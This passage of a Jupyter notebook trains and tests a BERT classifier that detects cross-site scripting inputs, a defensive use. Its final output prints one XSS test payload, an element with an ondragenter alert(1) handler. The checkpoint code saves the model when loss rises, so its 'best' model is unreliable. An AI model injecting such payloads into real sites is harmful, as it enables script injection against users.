      "Epoch : 110 Loss : 0.1478353887796402 Accuracy : 0.96875\n",
      "Epoch : 120 Loss : 0.21334591507911682 Accuracy : 0.921875\n",
      "Epoch : 130 Loss : 0.12783150374889374 Accuracy : 0.96875\n",
      "Epoch : 140 Loss : 0.22697244584560394 Accuracy : 0.921875\n",
      "Epoch : 150 Loss : 0.155649334192276 Accuracy : 0.953125\n",
      "Epoch : 160 Loss : 0.17096759378910065 Accuracy : 0.953125\n",
      "Epoch : 170 Loss : 0.17726390063762665 Accuracy : 0.953125\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "b4b1e79b386949b7b61ac55bf5ef528b"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.19377978146076202 Accuracy : 0.921875\n",
      "Epoch 01384: reducing learning rate of group 0 to 2.7683e-05.\n",
      "Epoch : 10 Loss : 0.17464737594127655 Accuracy : 0.921875\n",
      "Epoch : 20 Loss : 0.1297898143529892 Accuracy : 0.984375\n",
      "Epoch : 30 Loss : 0.09692230075597763 Accuracy : 0.984375\n",
      "Epoch : 40 Loss : 0.16328929364681244 Accuracy : 0.9375\n",
      "Epoch : 50 Loss : 0.14158624410629272 Accuracy : 0.953125\n",
      "Epoch : 60 Loss : 0.19065023958683014 Accuracy : 0.9375\n",
      "Epoch : 70 Loss : 0.19699932634830475 Accuracy : 0.953125\n",
      "Epoch : 80 Loss : 0.11892060190439224 Accuracy : 0.96875\n",
      "Epoch : 90 Loss : 0.13752301037311554 Accuracy : 0.984375\n",
      "Epoch : 100 Loss : 0.13023453950881958 Accuracy : 0.9375\n",
      "Epoch 01485: reducing learning rate of group 0 to 1.9378e-05.\n",
      "Epoch : 110 Loss : 0.17128828167915344 Accuracy : 0.9375\n",
      "Epoch : 120 Loss : 0.22053705155849457 Accuracy : 0.890625\n",
      "Epoch : 130 Loss : 0.34186995029449463 Accuracy : 0.953125\n",
      "Epoch : 140 Loss : 0.12074979394674301 Accuracy : 0.953125\n",
      "Epoch : 150 Loss : 0.20158807933330536 Accuracy : 0.921875\n",
      "Epoch : 160 Loss : 0.16830167174339294 Accuracy : 0.96875\n",
      "Epoch : 170 Loss : 0.15271393954753876 Accuracy : 0.953125\n"
     ]
    },
    {
     "data": {
      "text/plain": "  0%|          | 0/171 [00:00<?, ?it/s]",
      "application/vnd.jupyter.widget-view+json": {
       "version_major": 2,
       "version_minor": 0,
       "model_id": "dd361bec00d443a6ba914991916b4ad4"
      }
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Epoch : 0 Loss : 0.35835883021354675 Accuracy : 0.921875\n",
      "Epoch : 10 Loss : 0.1456552892923355 Accuracy : 0.9375\n",
      "Epoch : 20 Loss : 0.14765575528144836 Accuracy : 0.96875\n",
      "Epoch : 30 Loss : 0.21896621584892273 Accuracy : 0.90625\n",
      "Epoch 01586: reducing learning rate of group 0 to 1.3564e-05.\n",
      "Epoch : 40 Loss : 0.20409011840820312 Accuracy : 0.90625\n",
      "Epoch : 50 Loss : 0.2383417785167694 Accuracy : 0.90625\n",
      "Epoch : 60 Loss : 0.15576185286045074 Accuracy : 0.9375\n",
      "Epoch : 70 Loss : 0.18164683878421783 Accuracy : 0.921875\n",
      "Epoch : 80 Loss : 0.17661522328853607 Accuracy : 0.921875\n",
      "Epoch : 90 Loss : 0.19747745990753174 Accuracy : 0.921875\n",
      "Epoch : 100 Loss : 0.14846093952655792 Accuracy : 0.96875\n",
      "Epoch : 110 Loss : 0.1898484081029892 Accuracy : 0.9375\n",
      "Epoch : 120 Loss : 0.12109288573265076 Accuracy : 0.96875\n",
      "Epoch : 130 Loss : 0.15680445730686188 Accuracy : 0.96875\n",
      "Epoch 01687: reducing learning rate of group 0 to 9.4951e-06.\n",
      "Epoch : 140 Loss : 0.16655738651752472 Accuracy : 0.921875\n",
      "Epoch : 150 Loss : 0.19467832148075104 Accuracy : 0.9375\n",
      "Epoch : 160 Loss : 0.13018696010112762 Accuracy : 0.953125\n",
      "Epoch : 170 Loss : 0.2301328480243683 Accuracy : 0.921875\n",
      "========================Traning End==============================\n"
     ]
    }
   ],
   "source": [
    "from tqdm.auto import tqdm\n",
    "import pdb\n",
    "import  torchmetrics\n",
    "import os\n",
    "loss_list = []\n",
    "acc_list = []\n",
    "val_loss = []\n",
    "\n",
    "accuracy = torchmetrics.Accuracy(task='BINARY',num_classes=2).to(device)\n",
    "best_loss = None\n",
    "count = 0 \n",
    "SAVE_PATH = 'XSS_MODEL'\n",
    "for j in tqdm(range(10)):\n",
    "    model.train()\n",
    "    prgo_bar = tqdm(enumerate(train_DataLoader),total = int(len(train_dataset)/train_DataLoader.batch_size))\n",
    "    for i,batch in prgo_bar:\n",
    "        model.train()\n",
    "        input_ids = batch['input_ids'].to(device)\n",
    "        attention_mask = batch['attention_mask'].to(device)\n",
    "        labels = batch['labels'].to(device)\n",
    "        outputs = model(input_ids,attention_mask=attention_mask)\n",
    "        _ , preds = torch.max(outputs.logits,dim=1)\n",
    "        loss = loss_fn(outputs.logits,labels)\n",
    "        loss.backward()\n",
    "        \n",
    "        acc = accuracy(preds,labels)\n",
    "        loss_list.append(loss.item())\n",
    "        acc_list.append(acc)\n",
    "        \n",
    "        optimizer.step()\n",
    "        optimizer.zero_grad()\n",
    "        scheduler.step(acc)\n",
    "        if i%10 == 0:\n",
    "            print(\"Epoch : {} Loss : {} Accuracy : {}\".format(i,loss.item(),acc))\n",
    "            \n",
    "        if best_loss is None:\n",
    "            best_loss = loss.item()\n",
    "        elif loss.item() > best_loss:\n",
    "            best_loss = loss.item()\n",
    "            if not os.path.isdir(SAVE_PATH):\n",
    "                os.mkdir(SAVE_PATH)\n",
    "            torch.save(model.state_dict(),os.path.join(SAVE_PATH,'Bert{}.pt'.format(count)))\n",
    "        \n",
    "print(\"========================Traning End==============================\")\n"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-30T14:47:13.422016200Z",
     "start_time": "2024-05-30T14:30:47.821273900Z"
    }
   },
   "id": "7997fdd7f9131627"
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "outputs": [],
   "source": [
    "acc_list_cpu = list(map(lambda  x : x.cpu() ,acc_list))"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T16:00:15.607747Z",
     "start_time": "2024-05-26T16:00:15.539274300Z"
    }
   },
   "id": "b1159061ca7958d5"
  },
  {
   "cell_type": "code",
   "execution_count": 110,
   "outputs": [
    {
     "data": {
      "text/plain": "[<matplotlib.lines.Line2D at 0x28fa4c659f0>]"
     },
     "execution_count": 110,
     "metadata": {},
     "output_type": "execute_result"
    },
    {
     "data": {
      "text/plain": "<Figure size 1000x500 with 2 Axes>",
      "image/png": "[encoded data removed]"
     },
     "metadata": {},
     "output_type": "display_data"
    }
   ],
   "source": [
    "import matplotlib.pyplot as plt\n",
    "fig, ax = plt.subplots(1,2,figsize=(10,5))\n",
    "ax[0].set_title('Loss')\n",
    "ax[1].set_title('Accuracy')\n",
    "ax[0].plot(loss_list,color='red')\n",
    "ax[1].plot(acc_list_cpu,color='blue')"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T16:04:20.458753900Z",
     "start_time": "2024-05-26T16:04:20.195498Z"
    }
   },
   "id": "b62d7eca4794b147"
  },
  {
   "cell_type": "code",
   "execution_count": 58,
   "outputs": [
    {
     "data": {
      "text/plain": "0.703134298324585"
     },
     "execution_count": 58,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "best_loss"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-26T15:43:48.741895200Z",
     "start_time": "2024-05-26T15:43:48.726058Z"
    }
   },
   "id": "9d1882321d82fe1f"
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "torch.Size([1, 128])\n",
      "tensor([[-1.7180,  2.3879]], device='cuda:0')\n",
      "torch.Size([1, 2])\n",
      "XSS ATTACK CODE\n",
      "< small draggable = \" true \" ondragenter = \" alert ( 1 ) \" > test < / small >\n"
     ]
    }
   ],
   "source": [
    "from torch.utils.data import SubsetRandomSampler\n",
    "random_index = torch.randint(low=0,high=len(test_DataLoader),size=(1,)).item()\n",
    "sampler = SubsetRandomSampler([random_index])\n",
    "random_DataLoader = DataLoader(test_dataset,batch_size=1,sampler=sampler)\n",
    "SAVE_PATH = 'XSS_MODEL'\n",
    "model.load_state_dict(torch.load(os.path.join(SAVE_PATH,'Bert0.pt')))\n",
    "model.eval()\n",
    "with torch.no_grad():\n",
    "    for batch in random_DataLoader:\n",
    "        inputs = batch['input_ids'].to(device)\n",
    "        print(inputs.shape)\n",
    "        attention_mask = batch['attention_mask'].to(device)\n",
    "        labels = batch['label'].to(device)\n",
    "\n",
    "        # 모델 예측\n",
    "        outputs = model(input_ids=inputs, attention_mask=attention_mask, labels=labels)\n",
    "        print(outputs.logits)\n",
    "        print(outputs.logits.shape)\n",
    "        preds  = torch.argmax(outputs.logits,dim=1).item()\n",
    "        decode_text = tokenizer.decode(inputs[0],skip_special_tokens=True)\n",
    "        if preds == 1:\n",
    "            print('XSS ATTACK CODE')\n",
    "        \n",
    "        print(decode_text)\n",
    "\n",
    "        break"
   ],
   "metadata": {
    "collapsed": false,
    "ExecuteTime": {
     "end_time": "2024-05-27T02:58:15.835817Z",
     "start_time": "2024-05-27T02:58:15.266042300Z"
    }
   },
   "id": "9696589d325e2493"
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 2
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython2",
   "version": "2.7.6"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
